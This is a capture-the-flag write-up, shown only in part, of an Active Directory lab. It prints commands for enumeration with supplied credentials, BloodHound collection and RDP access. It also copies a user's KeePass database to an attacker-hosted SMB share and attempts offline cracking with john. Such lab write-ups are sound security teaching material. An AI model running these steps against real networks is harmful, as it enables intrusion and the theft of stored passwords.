---
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
  tags:
    visible: true
  actions:
    visible: true
  anchors:
    visible: true
---

# Forward

**Overview**\
Forward is a practical challenge that is built around an assumed breach scenario. Credentials of the user j.smith and corresponding password is provided and we have to navigate through the compromised Active Directory, move laterally through the domain and escalate our way through the domain.&#x20;

**Main concepts involved** \
nmap,RDP, KeePass, Active Directory, Bloodhound, Kerberos, RBCD, Impacket<br>

Recon

```
// nmap -sV -sC 10.113.172.120 
```

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

The above ports were found to be opened.  With the provided credentials we shall start with SMB and LDAP enumeratoin to understand what information the server exposes.

Let us first resolve the hostname to our IP, this will append 10.113.172.120   HOSTNAME to a local hosts file which then we can put the details into /etc/hosts.

```
// nxc smb 10.113.172.120 -u 'j.smith' -p 'JSmith@IT2024' --generate-hosts-file hosts
```

```
// cat hosts        
10.113.172.120     DC01.ctf.local ctf.local DC01
```

We authenticate as j.smith against SMB via NetExec and enumerate the shares.

```
// nxc smb 10.113.172.120 -u 'j.smith' -p 'JSmith@IT2024' --shares
```

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

We have a readable downloads share but when we login and enumerate the share we find it blank. We try the other shares but they have no concrete exposure.

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>



Bloodhound Enumeration

We focus on using bloodhound to enumerate the target. We use bloodhound-python to get a compressed file that we can then ingest to the bloodhound GUI that we will have started on our computer.&#x20;

```
// bloodhound-python -u 'j.smith' -p 'JSmith@IT2024' -d ctf.local -ns 10.113.172.120 -c All --zip

```

<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

After ingesting the .zip file to bloodhound UI and check for the user J.smith, we discover that he is part of the Remote Desktop Users and AppLocker-Restricted Groups.&#x20;

<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

We therefore rdc to j.smith with the credentials provided and open up a powershell terminal and check what we have in j.smith directories.

```
// xfreerdp /u:j.smith /p:'JSmith@IT2024' /d:ctf.local /v:10.113.172.120
```

<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

Something worth checking pops up and we see that under the Document's folder we have a Database.kdbx file which is database file format used by KeePass and KeePass-compatible password managers. It is encrypted and therefore high value target for offline cracking. We therefore need to get in to our local computer so that we can crack it.&#x20;

We will there host an smbserver and copy the file to our current working directory

```
// /usr/share/doc/python3-impacket/examples/smbserver.py share $(pwd) -username j.smith -password 'JSmith@IT2024' -smb2support -debug
```

<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

```
Copy the file from target to your tun0 address
// PS C:\Users\j.smith\Documents> copy .\Database.kdbx \\192.168.xxx.xxx\share
```

We extract the crackable hash using keepass2john and then use john. The hash couldnt be cracked in reasonable time and probably this was the existence of a strong master password or the KDF work factor (Argon2 with high memory/iteration settings is intentionally expensive to brute-force).

```
// keepass2john Database.kdbx > kdbx_hash.txt
 john --wordlist=/usr/share/wordlists/rockyou.txt kdbx_hash.txt
```

We therefore resorted to checking whether we could find anything related to keepass within the system and we came across a KeePass app.

